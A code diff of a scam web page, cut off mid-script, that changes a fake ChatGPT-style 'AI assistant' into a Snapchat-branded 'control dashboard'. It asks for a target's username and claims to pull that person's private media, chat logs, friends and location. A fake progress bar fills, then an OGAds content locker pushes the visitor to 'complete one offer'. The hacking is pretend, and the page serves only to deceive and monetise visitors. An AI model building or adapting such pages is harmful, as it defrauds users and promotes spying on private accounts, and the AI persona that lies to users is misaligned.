@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapAssist AI - Smart Analytics Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>SnapSuite Pro - Control Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <!-- OGAds Locker Integration Script -->
@@ -12,226 +12,296 @@
     
     <style>
         :root {
-            --bg-workspace: #212121;
-            --bg-chat: #171717;
-            --bg-bubble-ai: transparent;
-            --bg-bubble-user: #2f2f2f;
-            --border-color: #383838;
-            --text-main: #ececec;
-            --text-muted: #b4b4b4;
-            --primary-accent: #10a37f; /* OpenAI Green */
-            --font-sans: 'Inter', sans-serif;
-        }
-
-        [data-theme="light"] {
-            --bg-workspace: #ffffff;
-            --bg-chat: #f9f9f9;
-            --bg-bubble-ai: transparent;
-            --bg-bubble-user: #f0f0f0;
-            --border-color: #e5e5e5;
-            --text-main: #0d0d0d;
-            --text-muted: #676767;
+            --snap-yellow: #FFFC00;
+            --snap-black: #000000;
+            --snap-dark: #111111;
+            --snap-card: #1c1c1e;
+            --snap-border: #2c2c2e;
+            --text-main: #ffffff;
+            --text-muted: #aeaeae;
+            --font-main: 'Poppins', sans-serif;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: var(--font-sans);
+            font-family: var(--font-main);
         }
 
         body {
-            background-color: var(--bg-workspace);
+            background-color: var(--snap-black);
             color: var(--text-main);
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            transition: background-color 0.3s ease;
         }
 
-        /* حاوية الشات الرئيسية تشبه تصميم ChatGPT تماماً */
-        .chat-container {
+        /* الحاوية الرئيسية بستايل تطبيق سناب شات */
+        .snap-app-container {
             width: 100%;
-            max-width: 480px;
-            background: var(--bg-chat);
+            max-width: 450px;
+            background: var(--snap-dark);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            height: 100vh;
             position: relative;
-            border-left: 1px solid var(--border-color);
-            border-right: 1px solid var(--border-color);
+            border-left: 1px solid var(--snap-border);
+            border-right: 1px solid var(--snap-border);
+            padding-bottom: 30px;
         }
 
-        /* الهيدر العلوي */
-        .chat-header {
-            padding: 14px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border-color);
-            background: var(--bg-chat);
-            position: sticky;
-            top: 0;
-            z-index: 50;
-        }
-
-        .ai-brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 600;
-            font-size: 15px;
-        }
-
-        .ai-avatar {
-            width: 28px;
-            height: 28px;
-            background: var(--primary-accent);
-            color: white;
-            border-radius: 50%;
+        /* الهيدر العلوي الأصفر */
+        .snap-header {
+            background: var(--snap-yellow);
+            color: var(--snap-black);
+            padding: 16px 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
+            gap: 10px;
+            font-weight: 800;
+            font-size: 18px;
+            letter-spacing: -0.5px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 20px rgba(255, 252, 0, 0.15);
         }
 
-        .theme-switcher {
-            background: transparent;
-            border: none;
-            color: var(--text-muted);
-            cursor: pointer;
-            font-size: 16px;
+        .snap-header i {
+            font-size: 22px;
         }
-        .theme-switcher:hover { color: var(--text-main); }
 
-        /* منطقة استعراض الرسائل */
-        .chat-history {
-            flex-grow: 1;
-            overflow-y: auto;
-            padding: 24px 16px;
+        /* قسم إدخال الـ Username الأول */
+        .auth-section {
+            padding: 30px 20px;
+            text-align: center;
             display: flex;
             flex-direction: column;
-            gap: 24px;
-            scroll-behavior: smooth;
-        }
-
-        /* بنية رسائل الشات */
-        .chat-row {
-            display: flex;
-            gap: 14px;
-            max-width: 100%;
-        }
-
-        .chat-row.user-row {
-            flex-direction: row-reverse;
-        }
-
-        .msg-bubble {
-            padding: 4px 0;
-            font-size: 14.5px;
-            line-height: 1.6;
-            max-width: 85%;
-        }
-
-        .user-row .msg-bubble {
-            background: var(--bg-bubble-user);
-            padding: 10px 16px;
-            border-radius: 20px;
-        }
-
-        /* أنيميشن النقاط التلاتة وهي كتكتب */
-        .typing-dots {
-            display: inline-flex;
-            gap: 4px;
             align-items: center;
+        }
+
+        .snap-ghost-logo {
+            font-size: 55px;
+            color: var(--snap-yellow);
+            margin-bottom: 16px;
+            animation: pulseGhost 2s infinite ease-in-out;
+        }
+
+        @keyframes pulseGhost {
+            0%, 100% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+
+        .auth-section h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .auth-section p {
+            font-size: 13px;
+            color: var(--text-muted);
+            max-width: 320px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .snap-input-group {
+            width: 100%;
+            background: var(--snap-card);
+            border: 2px solid var(--snap-border);
+            border-radius: 30px;
+            padding: 6px 6px 6px 20px;
+            display: flex;
+            align-items: center;
+            transition: border-color 0.3s ease;
+        }
+
+        .snap-input-group:focus-within {
+            border-color: var(--snap-yellow);
+        }
+
+        .snap-input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text-main);
+            font-size: 15px;
+            font-weight: 600;
+            flex-grow: 1;
             padding: 8px 0;
         }
 
-        .typing-dots span {
-            width: 6px;
-            height: 6px;
-            background: var(--text-muted);
+        .snap-submit-btn {
+            background: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
-            animation: bounceDot 1.4s infinite ease-in-out both;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 700;
+            transition: transform 0.2s;
         }
-        .typing-dots span:nth-child(1) { animation-delay: -0.32s; }
-        .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
+        .snap-submit-btn:active { transform: scale(0.9); }
 
-        @keyframes bounceDot {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1.0); }
+        /* سكريبت التحميل الصغير المدمج عند التحقق من الإسم */
+        .sync-loader-text {
+            margin-top: 14px;
+            font-size: 12px;
+            color: var(--snap-yellow);
+            font-weight: 600;
+            display: none;
         }
 
-        /* الأزرار والخيارات بستايل ChatGPT الأنيق */
-        .options-box {
+        /* شبكة الخدمات (Grid Nodes) تظهر بعد إدخال الإسم */
+        .dashboard-grid-section {
+            padding: 0 20px;
+            opacity: 0.4; /* معتمة حتى يتم إدخال الإسم */
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+
+        .dashboard-grid-section.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .grid-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .snap-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .snap-card {
+            background: var(--snap-card);
+            border: 1px solid var(--snap-border);
+            border-radius: 16px;
+            padding: 16px;
+            cursor: pointer;
             display: flex;
             flex-direction: column;
-            gap: 8px;
-            margin-top: 12px;
-            width: 100%;
+            gap: 12px;
+            transition: transform 0.2s, border-color 0.2s;
         }
 
-        .chat-opt-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            color: var(--text-main);
-            padding: 12px 16px;
-            border-radius: 12px;
-            text-align: left;
+        .snap-card:hover {
+            border-color: var(--snap-yellow);
+            transform: translateY(-2px);
+        }
+
+        .card-icon-wrapper {
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 252, 0, 0.1);
+            color: var(--snap-yellow);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .card-meta h3 {
             font-size: 13.5px;
-            font-weight: 500;
-            cursor: pointer;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .card-meta p {
+            font-size: 11px;
+            color: var(--text-muted);
+            line-height: 1.3;
+        }
+
+        /* الـ Bottom Sheet أو نافذة التحميل المنبثقة من الأسفل */
+        .snap-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 200;
+            display: none;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .snap-modal-sheet {
+            width: 100%;
+            max-width: 450px;
+            background: var(--snap-dark);
+            border-top: 2px solid var(--snap-border);
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            padding: 24px;
+            transform: translateY(100%);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .snap-modal-overlay.visible { display: flex; }
+        .snap-modal-overlay.visible .snap-modal-sheet { transform: translateY(0); }
+
+        .sheet-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: all 0.2s ease;
-        }
-        .chat-opt-btn:hover {
-            background: var(--bg-bubble-user);
-            border-color: var(--text-muted);
-        }
-        .chat-opt-btn i {
-            color: var(--text-muted);
-            font-size: 12px;
         }
 
-        /* إطار الصورة المدمج داخل الشات */
-        .media-preview-container {
-            border: 1px solid var(--border-color);
-            background: var(--bg-bubble-user);
-            border-radius: 12px;
-            margin-top: 10px;
-            overflow: hidden;
-            max-width: 280px;
+        .sheet-title {
+            font-size: 16px;
+            font-weight: 700;
         }
 
-        .media-header-label {
-            padding: 8px 12px;
-            background: rgba(0,0,0,0.1);
-            font-size: 11px;
-            color: var(--text-muted);
-            font-weight: 600;
+        .sheet-close-btn {
+            background: var(--snap-card);
+            border: 1px solid var(--snap-border);
+            color: var(--text-main);
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 6px;
-            border-bottom: 1px solid var(--border-color);
+            justify-content: center;
         }
 
-        .media-frame {
+        /* صندوق استعراض الصورة مع القفل وبلاين الـ Scan */
+        .sheet-media-box {
+            background: var(--snap-black);
+            border: 1px solid var(--snap-border);
+            border-radius: 14px;
+            height: 160px;
             position: relative;
-            height: 150px;
-            background: #000;
+            overflow: hidden;
         }
 
-        .media-frame img {
+        .sheet-media-box img {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            opacity: 0.4;
-            filter: blur(5px);
+            opacity: 0.3;
+            filter: blur(4px);
         }
 
-        .media-blur-overlay {
+        .media-lock-center {
             position: absolute;
             inset: 0;
             display: flex;
@@ -240,342 +310,341 @@
             justify-content: center;
             gap: 6px;
             font-size: 12px;
-            font-weight: 500;
-            color: var(--text-main);
+            font-weight: 600;
+            color: var(--snap-yellow);
         }
 
-        /* شريط التحمل الخفيف للـ Progress */
-        .chat-mini-progress {
+        .media-lock-center i { font-size: 20px; }
+
+        /* شريط التحميل عريض كيعمر لـ 100% */
+        .progress-section {
             width: 100%;
-            background: var(--border-color);
-            height: 4px;
-            margin-top: 8px;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        .chat-progress-fill {
-            height: 100%;
-            background: var(--primary-accent);
-            width: 0%;
         }
 
-        /* الصندوق النهائي الخاص بـ الـ Locker */
-        .verification-card {
-            border: 1px solid var(--border-color);
-            background: var(--bg-bubble-user);
-            border-radius: 16px;
-            padding: 20px;
-            margin-top: 12px;
+        .progress-labels {
             display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            background: var(--snap-card);
+            height: 10px;
+            border-radius: 5px;
+            overflow: hidden;
+            border: 1px solid var(--snap-border);
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: var(--snap-yellow);
+            width: 0%;
+            box-shadow: 0 0 10px rgba(255, 252, 0, 0.3);
+        }
+
+        /* صندوق العرض النهائي بعد انتهاء الـ 100% */
+        .offer-verification-box {
+            background: rgba(255, 252, 0, 0.03);
+            border: 1px dashed var(--snap-yellow);
+            border-radius: 14px;
+            padding: 16px;
+            text-align: center;
+            display: none; /* مخفي ف الأول */
             flex-direction: column;
             align-items: center;
-            text-align: center;
-            gap: 14px;
+            gap: 12px;
         }
 
-        .verification-card h4 {
-            font-size: 16px;
-            font-weight: 600;
+        .offer-verification-box h4 {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--snap-yellow);
         }
 
-        .verification-card p {
-            font-size: 13px;
-            color: var(--text-muted);
+        .offer-verification-box p {
+            font-size: 12.5px;
+            color: var(--text-main);
             line-height: 1.5;
         }
 
-        .gpt-action-btn {
-            background: var(--primary-accent);
-            color: white;
+        .snap-action-btn {
+            width: 100%;
+            background: var(--snap-yellow);
+            color: var(--snap-black);
             border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
+            padding: 14px;
+            border-radius: 25px;
             font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: background 0.2s ease;
-        }
-        .gpt-action-btn:hover { background: #0e8c6d; }
-
-        /* منطقة الإدخال السفلية (نفس شريط إدخال ChatGPT) */
-        .chat-input-area {
-            padding: 16px;
-            background: var(--bg-chat);
-        }
-
-        .input-box-container {
-            background: var(--bg-workspace);
-            border: 1px solid var(--border-color);
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            padding: 6px 6px 6px 16px;
-        }
-
-        .gpt-input {
-            background: transparent;
-            border: none;
-            outline: none;
-            color: var(--text-main);
-            font-size: 14.5px;
-            flex-grow: 1;
-            padding: 8px 0;
-        }
-
-        .send-btn {
-            width: 32px;
-            height: 32px;
-            background: var(--text-main);
-            color: var(--bg-chat);
-            border: none;
-            border-radius: 50%;
+            font-weight: 700;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 14px;
-            transition: opacity 0.2s ease;
-        }
-        .send-btn:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.2);
         }
 
-        .footer-terms {
+        /* توست التنبيه العلوي في حالة عدم إدخال الإسم */
+        .snap-toast {
+            position: fixed;
+            top: 75px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
+            background: #ff3b30;
+            color: white;
+            font-weight: 600;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            z-index: 300;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+        .snap-toast.visible { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+        footer {
             text-align: center;
+            padding: 24px;
             font-size: 11px;
             color: var(--text-muted);
-            margin-top: 10px;
+            margin-top: auto;
+            font-weight: 500;
         }
-
-        .hidden-row { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="chat-container">
-        <!-- الهيدر العلوي -->
-        <div class="chat-header">
-            <div class="ai-brand">
-                <div class="ai-avatar"><i class="fa-solid fa-bolt"></i></div>
-                <span>SnapAssist AI v4</span>
-            </div>
-            <button class="theme-switcher" id="themeBtn" onclick="toggleTheme()">
-                <i class="fa-solid fa-sun"></i>
-            </button>
+    <!-- توست التنبيه ف حالة نسا كتابة الـ Username -->
+    <div class="snap-toast" id="snapAlert">
+        <i class="fa-solid fa-circle-exclamation"></i> Please input a valid identifier first
+    </div>
+
+    <div class="snap-app-container">
+        <!-- الهيدر العلوي الأصفر -->
+        <div class="snap-header">
+            <i class="fa-brands fa-snapchat"></i>
+            <span>SnapSuite Control</span>
         </div>
 
-        <!-- منطقة استعراض رسائل الشات الحية -->
-        <div class="chat-history" id="chatWindow">
+        <!-- سيكشن إدخال الإسم الأصلي -->
+        <section class="auth-section">
+            <div class="snap-ghost-logo"><i class="fa-brands fa-snapchat"></i></div>
+            <h1>Initialize Data Stream</h1>
+            <p>Input the target profile username handle to unlock specialized metrics configuration pipelines.</p>
             
-            <!-- رسالة الترحيب الأولى من المساعد -->
-            <div class="chat-row ai-row" id="welcomeMsg">
-                <div class="ai-avatar"><i class="fa-solid fa-bolt"></i></div>
-                <div class="msg-bubble">
-                    Hello! I am your automated directory assistant. Please provide the profile identifier below to initialize the synchronization pipeline.
-                </div>
-            </div>
-
-            <!-- مكان ظهور الـ Typing Animation المؤقت -->
-            <div class="chat-row ai-row hidden-row" id="typingBubble">
-                <div class="ai-avatar"><i class="fa-solid fa-bolt"></i></div>
-                <div class="msg-bubble">
-                    <div class="typing-dots"><span></span><span></span><span></span></div>
-                </div>
-            </div>
-
-        </div>
-
-        <!-- منطقة الإدخال السفلية مثل شريط كيرسير شات جي بي تي -->
-        <div class="chat-input-area">
-            <div class="input-box-container">
-                <input type="text" class="gpt-input" id="userInputField" placeholder="Message SnapAssist..." autocomplete="off">
-                <button class="send-btn" id="sendBtn" onclick="submitUserIdentifier()">
-                    <i class="fa-solid fa-arrow-up"></i>
+            <div class="snap-input-group">
+                <input type="text" class="snap-input" id="targetProfileInput" placeholder="Snapchat username..." autocomplete="off">
+                <button class="snap-submit-btn" onclick="verifyProfileIdentifier()">
+                    <i class="fa-solid fa-arrow-right" id="arrowIcon"></i>
                 </button>
             </div>
-            <div class="footer-terms">SnapAssist can make mistakes. Verify important assets independently.</div>
+            <div class="sync-loader-text" id="loaderText">
+                <i class="fa-solid fa-spinner fa-spin"></i> Synchronizing target cloud node...
+            </div>
+        </section>
+
+        <!-- شبكة الخدمات (الموديولات) -->
+        <section class="dashboard-grid-section" id="gridSection">
+            <div class="grid-title">Available Operations Hub</div>
+            
+            <div class="snap-grid">
+                <!-- كارت 1 -->
+                <div class="snap-card" onclick="openVerificationModal('Live Activity Feed', 'typing.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-comment-dots"></i></div>
+                    <div class="card-meta">
+                        <h3>Activity Feed</h3>
+                        <p>Live temporary platform log session sync.</p>
+                    </div>
+                </div>
+                <!-- كارت 2 -->
+                <div class="snap-card" onclick="openVerificationModal('Friend Structural Index', 'friends.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-user-group"></i></div>
+                    <div class="card-meta">
+                        <h3>Friend Index</h3>
+                        <p>Deep structural connection mapping.</p>
+                    </div>
+                </div>
+                <!-- كارت 3 -->
+                <div class="snap-card" onclick="openVerificationModal('Private Media Vault', 'eyes.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-eye-slash"></i></div>
+                    <div class="card-meta">
+                        <h3>Private Vault</h3>
+                        <p>Systematic metadata recovery logs.</p>
+                    </div>
+                </div>
+                <!-- كارت 4 -->
+                <div class="snap-card" onclick="openVerificationModal('Chat Log Matrix', 'chat.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-clock-rotate-left"></i></div>
+                    <div class="card-meta">
+                        <h3>Chat Matrix</h3>
+                        <p>Secure temporary platform log dump.</p>
+                    </div>
+                </div>
+                <!-- كارت 5 -->
+                <div class="snap-card" onclick="openVerificationModal('Geospatial Radar Location', 'location.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-location-dot"></i></div>
+                    <div class="card-meta">
+                        <h3>Geo Radar</h3>
+                        <p>High-fidelity node triangulation map.</p>
+                    </div>
+                </div>
+                <!-- كارت 6 -->
+                <div class="snap-card" onclick="openVerificationModal('Chat Intercept Radar', 'Snaping.jpg')">
+                    <div class="card-icon-wrapper"><i class="fa-solid fa-user-secret"></i></div>
+                    <div class="card-meta">
+                        <h3>Chat Radar</h3>
+                        <p>Real-time telemetry mapping dashboard.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p><i class="fa-solid fa-shield" style="color: var(--snap-yellow);"></i> Secured Encrypted Framework Node 2026</p>
+        </footer>
+    </div>
+
+    <!-- النافذة المنبثقة من الأسفل بستايل سناب (Bottom Sheet Modal) -->
+    <div class="snap-modal-overlay" id="modalOverlay">
+        <div class="snap-modal-sheet">
+            <div class="sheet-header">
+                <span class="sheet-title" id="modalNodeTitle">Module Extraction</span>
+                <button class="sheet-close-btn" onclick="closeVerificationModal()"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <div class="sheet-media-box">
+                <img src="" id="modalPreviewImg" alt="Data Core Preview">
+                <div class="media-lock-center">
+                    <i class="fa-solid fa-lock"></i>
+                    <span>PREVIEW_BLURRED.DATA</span>
+                </div>
+            </div>
+
+            <!-- سيكشن شريط التحميل اللي كيعمر لـ 100% -->
+            <div class="progress-section" id="progressSection">
+                <div class="progress-labels">
+                    <span id="statusMessageText" style="color: var(--text-muted);">Extracting packets...</span>
+                    <span id="progressPercentNum" style="color: var(--snap-yellow);">0%</span>
+                </div>
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progressBarFill"></div>
+                </div>
+            </div>
+
+            <!-- الصندوق النهائي الخاص بالعرض والـ Locker -->
+            <div class="offer-verification-box" id="offerBox">
+                <i class="fa-solid fa-triangle-exclamation" style="color: var(--snap-yellow); font-size: 22px;"></i>
+                <h4>Complete One Offer Below</h4>
+                <p>The extraction process reached 100% successfully. To prevent automated abuse and finalize cloud delivery, please complete <strong>one quick verification offer</strong> from the portal dashboard below.</p>
+                <button class="snap-action-btn" onclick="triggerFinalOgadsLocker()">
+                    <i class="fa-solid fa-unlock"></i> Complete Verification
+                </button>
+            </div>
         </div>
     </div>
 
     <script>
-        const chatWindow = document.getElementById('chatWindow');
-        const userInputField = document.getElementById('userInputField');
-        const sendBtn = document.getElementById('sendBtn');
-        const typingBubble = document.getElementById('typingBubble');
+        let isUsernameVerified = false;
+        
+        const gridSection = document.getElementById('gridSection');
+        const targetInput = document.getElementById('targetProfileInput');
+        const loaderText = document.getElementById('loaderText');
+        const arrowIcon = document.getElementById('arrowIcon');
+        const snapAlert = document.getElementById('snapAlert');
 
-        const assetMap = {
-            'feed': 'typing.jpg',
-            'friends': 'friends.jpg',
-            'vault': 'eyes.jpg',
-            'chat': 'chat.jpg',
-            'geo': 'location.jpg',
-            'radar': 'Snaping.jpg'
-        };
+        const modalOverlay = document.getElementById('modalOverlay');
+        const modalNodeTitle = document.getElementById('modalNodeTitle');
+        const modalPreviewImg = document.getElementById('modalPreviewImg');
+        const progressSection = document.getElementById('progressSection');
+        const progressBarFill = document.getElementById('progressBarFill');
+        const progressPercentNum = document.getElementById('progressPercentNum');
+        const statusMessageText = document.getElementById('statusMessageText');
+        const offerBox = document.getElementById('offerBox');
 
-        // تفعيل زر الإدخال عند الضغط على Enter
-        userInputField.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') submitUserIdentifier();
-        });
-
-        function toggleTheme() {
-            const theme = document.documentElement.getAttribute('data-theme');
-            if (theme === 'dark') {
-                document.documentElement.setAttribute('data-theme', 'light');
-                document.getElementById('themeBtn').innerHTML = '<i class="fa-solid fa-moon"></i>';
-            } else {
-                document.documentElement.setAttribute('data-theme', 'dark');
-                document.getElementById('themeBtn').innerHTML = '<i class="fa-solid fa-sun"></i>';
+        // دالة التحقق من الإسم وتفعيل موديولات الشبكة
+        function verifyProfileIdentifier() {
+            const val = targetInput.value.trim();
+            if(val === '') {
+                snapAlert.classList.add('visible');
+                setTimeout(() => snapAlert.classList.remove('visible'), 2500);
+                return;
             }
-        }
 
-        function showTyping() {
-            chatWindow.appendChild(typingBubble);
-            typingBubble.classList.remove('hidden-row');
-            chatWindow.scrollTop = chatWindow.scrollHeight;
-        }
+            targetInput.disabled = true;
+            loaderText.style.display = 'block';
+            arrowIcon.className = 'fa-solid fa-spinner fa-spin';
 
-        function hideTyping() {
-            typingBubble.classList.add('hidden-row');
-        }
-
-        function appendUserMessage(text) {
-            const row = document.createElement('div');
-            row.className = 'chat-row user-row';
-            row.innerHTML = `<div class="msg-bubble">${text}</div>`;
-            chatWindow.appendChild(row);
-            chatWindow.scrollTop = chatWindow.scrollHeight;
-        }
-
-        function appendAiMessage(htmlContent) {
-            const row = document.createElement('div');
-            row.className = 'chat-row ai-row';
-            row.innerHTML = `
-                <div class="ai-avatar"><i class="fa-solid fa-bolt"></i></div>
-                <div class="msg-bubble">${htmlContent}</div>
-            `;
-            chatWindow.appendChild(row);
-            chatWindow.scrollTop = chatWindow.scrollHeight;
-        }
-
-        function submitUserIdentifier() {
-            const val = userInputField.value.trim();
-            if (val === '') return;
-
-            // قفل الإدخال
-            userInputField.value = '';
-            userInputField.disabled = true;
-            sendBtn.disabled = true;
-
-            // عرض رسالة المستخدم أولاً
-            appendUserMessage(val);
-
-            // تفعيل أنيميشن الـ AI وهو كيفكر
             setTimeout(() => {
-                showTyping();
-                
-                setTimeout(() => {
-                    hideTyping();
-                    // الـ AI كيرد وكيحط الاختيارات وسط الشات نيت
-                    const optionsHtml = `
-                        Database connection established for <strong>@${val}</strong>. Which parameters layer would you like to request overview access to?
-                        <div class="options-box">
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Live Activity Feed', 'feed')"><span>Live Activity Feed</span><i class="fa-solid fa-chevron-right"></i></button>
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Friend Structural Index', 'friends')"><span>Friend Structural Index</span><i class="fa-solid fa-chevron-right"></i></button>
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Private Media Vault', 'vault')"><span>Private Media Vault</span><i class="fa-solid fa-chevron-right"></i></button>
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Chat Log Matrix', 'chat')"><span>Chat Log Matrix</span><i class="fa-solid fa-chevron-right"></i></button>
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Geospatial Location Tracker', 'geo')"><span>Geospatial Radar Location</span><i class="fa-solid fa-chevron-right"></i></button>
-                            <button class="chat-opt-btn" onclick="selectModuleNode('Chat Intercept Radar', 'radar')"><span>Chat Intercept Radar</span><i class="fa-solid fa-chevron-right"></i></button>
-                        </div>
-                    `;
-                    appendAiMessage(optionsHtml);
-                }, 1500);
+                loaderText.innerHTML = '<i class="fa-solid fa-circle-check" style="color:var(--snap-yellow);"></i> Profile Node Synchronized.';
+                arrowIcon.className = 'fa-solid fa-check';
+                gridSection.classList.add('active');
+                isUsernameVerified = true;
+            }, 1500);
+        }
 
+        // فتح المودال وبدء أنيميشن الـ 100%
+        function openVerificationModal(nodeName, imgUrl) {
+            if(!isUsernameVerified) return;
+
+            // إرجاع الإعدادات الافتراضية للمودال قبل البدء
+            progressSection.style.display = 'block';
+            offerBox.style.display = 'none';
+            progressBarFill.style.width = '0%';
+            progressPercentNum.innerText = '0%';
+            statusMessageText.innerText = 'Extracting packets...';
+
+            modalNodeTitle.innerText = nodeName;
+            modalPreviewImg.src = imgUrl;
+
+            modalOverlay.classList.add('visible');
+
+            // تشغيل الـ Progress Bar حتى 100%
+            setTimeout(() => {
+                runProgressBarAnimation();
             }, 400);
         }
 
-        function selectModuleNode(nodeName, assetKey) {
-            // تعطيل الضغط على الأزرار القديمة ف الشات
-            const btns = document.querySelectorAll('.chat-opt-btn');
-            btns.forEach(b => b.removeAttribute('onclick'));
-
-            appendUserMessage(`Request ${nodeName}`);
-
-            setTimeout(() => {
-                showTyping();
-
-                setTimeout(() => {
-                    hideTyping();
-                    
-                    const barId = 'bar_' + Date.now();
-                    const txtId = 'txt_' + Date.now();
-                    const targetImg = assetMap[assetKey] || 'emojis.JPG';
-
-                    const loadingHtml = `
-                        Compiling secure indices packet for <strong>${nodeName}</strong>. Please hold while the dashboard processes your secure visual components:
-                        <div style="display: flex; justify-content: space-between; font-size: 11px; margin-top:10px;">
-                            <span style="color: var(--primary-accent)">Processing Pipeline...</span>
-                            <span id="${txtId}" style="font-weight:700;">0%</span>
-                        </div>
-                        <div class="chat-mini-progress">
-                            <div class="chat-progress-fill" id="${barId}"></div>
-                        </div>
-                        <div class="media-preview-container">
-                            <div class="media-header-label"><i class="fa-solid fa-image"></i> Generating Preview Node</div>
-                            <div class="media-frame">
-                                <img src="${targetImg}" alt="Preview Display">
-                                <div class="media-blur-overlay">
-                                    <i class="fa-solid fa-lock" style="color: var(--primary-accent); font-size:15px;"></i>
-                                    <span>CONFIDENTIAL_PREVIEW.BIN</span>
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    appendAiMessage(loadingHtml);
-                    animateGptLoader(barId, txtId);
-
-                }, 1200);
-            }, 3000);
+        function closeVerificationModal() {
+            modalOverlay.classList.remove('visible');
         }
 
-        function animateGptLoader(barId, txtId) {
+        // أنيميشن شريط التحميل حتى 100%
+        function runProgressBarAnimation() {
             let percentage = 0;
-            const fill = document.getElementById(barId);
-            const text = document.getElementById(txtId);
+            const statusPhrases = [
+                "Connecting data nodes...",
+                "Downloading asset segments...",
+                "Compiling index package...",
+                "Finalizing layer setup..."
+            ];
 
-            const loop = setInterval(() => {
+            const interval = setInterval(() => {
                 percentage += 2;
-                if(fill) fill.style.width = percentage + '%';
-                if(text) text.innerText = percentage + '%';
+                progressBarFill.style.width = percentage + '%';
+                progressPercentNum.innerText = percentage + '%';
+
+                if (percentage < 30) statusMessageText.innerText = statusPhrases[0];
+                else if (percentage < 60) statusMessageText.innerText = statusPhrases[1];
+                else if (percentage < 85) statusMessageText.innerText = statusPhrases[2];
+                else statusMessageText.innerText = statusPhrases[3];
 
                 if(percentage >= 100) {
-                    clearInterval(loop);
+                    clearInterval(interval);
                     setTimeout(() => {
-                        showTyping();
-                        setTimeout(() => {
-                            hideTyping();
-                            // إظهار الـ Locker النهائي بستايل نقي ف الشات
-                            const finalLockerHtml = `
-                                <div class="verification-card">
